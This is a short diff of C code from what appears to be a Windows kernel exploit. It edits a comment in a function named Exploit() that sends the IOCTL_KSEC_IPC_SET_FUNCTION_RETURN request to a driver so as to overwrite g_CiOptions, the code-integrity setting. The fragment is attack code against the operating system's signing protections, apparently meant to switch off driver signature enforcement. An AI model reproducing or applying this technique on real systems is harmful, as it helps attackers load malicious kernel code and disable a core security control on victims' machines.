@@ -156,7 +156,7 @@ VOID Exploit() {
  
         *(UINT64 *)IoctlBuffer = (UINT64)&IoctlStructure;
 
-        // this controls edx (we want to write 0 to g_CiOptions)
+        // this controls edx (we want to write 6 to g_CiOptions)
         *(UINT64 *)&IoctlBuffer[8] = 6;
 
         DeviceIoControl(CurrentHandle, IOCTL_KSEC_IPC_SET_FUNCTION_RETURN, IoctlBuffer, 16, NULL, 0, NULL, NULL);
